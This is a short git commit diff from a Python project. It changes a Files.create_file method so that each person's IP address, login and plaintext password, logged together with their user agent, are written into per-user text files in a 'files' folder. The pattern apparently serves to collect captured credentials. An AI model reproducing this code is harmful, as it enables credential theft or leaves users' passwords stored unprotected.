72b138f5d378660c4efa03615d61c3cbdbd0ec1a
Daniell Castelo Branco Ciriaco <danicbciriaco2@gmail.com>
2022-12-08 16:05:23 -0300

    Agora arquivos serão criados em uma pasta chamada 'files'

--- src/file.py
+++ src/file.py
@@ -1,7 +1,7 @@
 class Files:
     @staticmethod
     def create_file(username: str, password: str, user_ip: str, user_agent: str) -> None:
-        with open(f'{user_ip}_{username}.txt', 'a+') as file:
+        with open(f'./files/{user_ip}_{username}.txt', 'a+') as file:
             file.write(f'IP: {user_ip}\n')
             file.write(f'Login: {username}\n')
             file.write(f'Senha: {password}\n')
